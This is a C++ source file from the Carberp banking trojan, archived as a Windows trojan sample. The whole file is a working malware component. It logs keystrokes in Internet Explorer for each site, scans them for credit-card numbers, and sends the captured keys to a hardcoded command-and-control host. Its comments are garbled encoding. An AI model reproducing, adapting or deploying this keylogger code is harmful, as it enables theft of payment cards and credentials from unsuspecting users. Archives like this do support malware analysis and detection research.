/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

 #include "Modules.h"

 #ifdef CCH
//===================================================================


#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "Config.h"
#include "BotHTTP.h"
#include "cc.h"


#include "BotDebug.h"

namespace DBGCC
{
	#include "DbgTemplates.h"
}

#define CCDBG DBGCC::DBGOutMessage<>

static char ��_HOSTS[CCHOSTS_PARAM_SIZE] = CCHOSTS_PARAM_NAME;

//������� ���������� ������ ��������, ��� ���������� � ����� CreditCardNomber.cpp
int FindCreditCard( char* pSrc, int szSrc, int fromSrc, char* pDst, int& posEnd );
//������� ������������� ������� � ��������� ��� ��������, ���������� � ����� UniversalKeyLogger.cpp
bool GetNonPrintCharText(DWORD Char, PCHAR &Buf);

namespace CC
{

struct UrlKeys
{
	char url[64]; //����� �� ������� ������ �������
	char keys[256]; //���� ��������� ��������
	int endPos; //������� ���������� ���������� ������� 
	char numCard[24]; //����� ��������� �����
	int posCard; //������� ��������� ����� � ������� keys (-1 - ����� �� �������)
	int posEndCard; //������� ��������� ����� ���������� ������ �����
};

UrlKeys* currData; //���� ������� ����� ������
PList listData; //������ ����������� �����

static void FlushLog();

static UrlKeys* AddUrl( const char* url )
{
	UrlKeys* uk = (UrlKeys*)MemAlloc( sizeof(UrlKeys) );
	if( uk == 0 ) return 0;
	int len = m_lstrlen(url);
	if( len >= sizeof(uk->url) ) len = sizeof(uk->url) - 1;
	m_memcpy( uk->url, url, len );
	uk->url[len] = 0;
	uk->endPos = -1;
	uk->posCard = -1;
	List::Add( listData, uk );
	return uk;
}

static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	TURLREC UR;
	if( ParseURL( (char*)Data, &UR, false ) )
	{
		//���� ����� ��� � ������
		int count = List::Count(listData);
		currData = 0;
		for( int i = 0; i < count; i++ )
		{
			UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
			if( m_lstrcmp( uk->url, UR.Host ) == 0 )
			{
				currData = uk;
				break;
			}
		}
		if( currData == 0 ) //������ ���� ��� �� ����, ���������
			currData = AddUrl(UR.Host);
		ClearURL(&UR);
	}
	//���� �� �����-�� ������� ��� �� ��� ������ ��� �� ��� ��������, �� ��������� �� ��������� �����������
	if( currData == 0 )
		currData = (UrlKeys*)List::GetItem( listData, 0 );
	FlushLog(); //��� ����� ���� ���������� ��� ������ ������� ����������
	CCDBG( "CC", "�������� ��� %s", currData->url );
}

static char* CharToHex( unsigned char c, char* buf )
{
	buf[0] = '{';
	buf[1] = '0';
	buf[2] = 'x';
	int v = c >> 4;
	buf[3] = v <= 9 ? '0' + v : 'A' + v - 10;
	v = c & 0xf;
	buf[4] = v <= 9 ? '0' + v : 'A' + v - 10;
	buf[5] = '}';
	buf[6] = 0;
	return buf;
}

const char* panelaz = "az.gipa.in"; //"sberbanksystem.ru";

static char* GetAzUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, panelaz );
#else
	string host = GetActiveHostFromBuf2( ��_HOSTS, 0xF9203A43 /* __CC_HOSTS__ */, ��HOSTS_PARAM_ENCRYPTED );
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

static void SendLog( UrlKeys* uk )
{
	CCDBG( "CC", "������� �������� %s, ������� %d, ���: '%s'", uk->numCard, uk->posCard, uk->url );
	char* log = (char*)MemAlloc( sizeof(uk->keys) * 5 + 128 );
	fwsprintfA pwsprintf = Get_wsprintfA();
	//pwsprintf( log, "Url: %s\nFinded card: %s\nLogged keys: ", uk->url, uk->numCard );

	int delim = 0; //������� ���������� ������ ��� ��������� ������ �����
	for( int i = 0; i <= uk->endPos; i++ )
	{
		unsigned char c = uk->keys[i];
		//�������� ����� ����� � ������ ��������
		if( i == currData->posCard && delim == 0 )
		{
			c = '[';
			i--;
			delim++;
		}
		if( i == currData->posEndCard + 1 && delim == 1 )
		{
			c = ']';
			i--;
			delim++;
		}
		const char* nameKey = 0;
		switch(c)
		{
			case VK_RETURN:		nameKey = "{Enter}"; break;
			case CHAR_DELETE:	nameKey = "{Del}"; break;
			case CHAR_LEFT:		nameKey = "{Left}"; break;
			case CHAR_RIGHT:	nameKey = "{Right}"; break;
			case CHAR_UP:		nameKey = "{Up}"; break;
			case CHAR_DOWN:		nameKey = "{Down}"; break;
			case CHAR_BACK:		nameKey = "{Back}"; break;
			case CHAR_TAB:		nameKey = "{Tab}"; break;
		}
		if( nameKey )
		{
			m_lstrcat( log, nameKey );
		}
		else
		{
			char buf[16];
			if( c < 32 )
			{
				CharToHex( c, buf );
			}
			else
			{
				buf[0] = c;
				buf[1] = 0;
			}
			m_lstrcat( log, buf );
		}
	}
	int lenLog = m_lstrlen(log);
	MemPtr<1024> mem;
	char* azUrl = GetAzUrl(mem.str());
	char* uid = mem.str() + 128;
	char* postUrl = mem.str() + 256;
	if( azUrl )
	{
		GenerateUid(uid);
		pwsprintf( postUrl, "%s/cat/?mode=save&subsys=keylog", azUrl );
		CCDBG( "CC", "���������� ��� � %s", postUrl );
		PStrings fields = Strings::Create();
		AddURLParam( fields, "id", (char*)uid );
		AddURLParam( fields, "log", log, lenLog );
		THTTPResponse response;
	    ClearStruct(response);
		HTTP::Post( (char*)postUrl, fields, 0, &response );
		Strings::Free(fields);
		HTTPResponse::Clear(&response);
	}
/*
	char cabFile[MAX_PATH];
	File::GetTempName(cabFile);
	HCAB cab = CreateCab(cabFile);
	AddBlobToCab( cab, mem, len, "LogFile.txt" );
	CloseCab(cab);
//	CCDBG( "CC", "CAB �������� � ����� %s", cabFile );
//	DataGrabber::SendCabDelayed( 0, cabFile, "CC" );
	pDeleteFileA(cabFile);
*/
	MemFree(log);
	//������� �����
	uk->endPos = -1;
	uk->posCard = -1;
}

//���������� ��� ��� � ����, ���� ���� ������ ��������
static void FlushLog()
{
	int count = List::Count(listData);
	CCDBG( "CC", "����� %d", count );
	for( int i = 0; i < count; i++ )
	{
		UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
		CCDBG( "CC", "��� %s, %d", uk->url, uk->posCard );
		if( uk->posCard >= 0 )
			SendLog(uk);
	}
}

static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	char* keys = (char*)Data;
	while( *keys )
	{
		CCDBG( "CC", "Key: %c (%02x)", *keys, (int)(unsigned char)*keys );
		currData->endPos++;
		if( currData->endPos >= sizeof(currData->keys) ) //����� ��������, �������� ���, ������ 1-� ������
		{
			m_memcpy( currData->keys, currData->keys + 1, sizeof(currData->keys) );
			currData->endPos--;
			if( currData->posCard >= 0 ) currData->posCard--; //������� �������� ���� ����������
		}
		currData->keys[currData->endPos] = *keys;
		
		if( currData->posCard >= 0 ) //�������� �������
		{
			//���� ����� ������ �������� ����� ����� 100 ��������, �������� ��� � �������
			if( currData->endPos - currData->posCard >= 100 )
				SendLog(currData);
		}
		else //�������� ��� �� �������
		{
			if( currData->endPos > 20 ) //�������� ���������� �������� ������ ����� ����� 20 ��������
			{
				currData->posCard = FindCreditCard( currData->keys, currData->endPos + 1, 0, currData->numCard, currData->posEndCard );
				if( currData->posCard >= 0 )
				{
					CCDBG( "CC", "���������� ����� %s", currData->numCard );
				}
			}
		}
		keys++;
	}
}



static void OnClose(LPVOID Sender)
{
	FlushLog(); //���������� ��� ������ ������� ����������
}

bool Init(DWORD hashApp)
{
	PKeyLogSystem S = KeyLogger::AddSystem("CC", PROCESS_HASH_IE);
	if( S != NULL )
	{
		S->TimeMode = KLG_TIME_INFINITE;
		S->OnProcessClose = OnClose;
		PKlgWndFilter F = KeyLogger::AddFilter(S, false, false, "*", "*", FILTRATE_ALL_WND, LOG_KEYBOARD, 5);
		listData = List::Create();
		//��������� ������� ��� ����� ������������� ������� ����� ��� ����������
		currData = AddUrl("Unknow url");
		if( currData )
		{
			KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, URLChanged);
			KeyLogger::ConnectEventHandler(KLE_ADD_TEXT_LOG, PushedKey);
			CCDBG( "CC", "������� �� ��������" );
			return true;
		}
	}
	return false;
};

}



//===================================================================
 #endif  /* CCH */
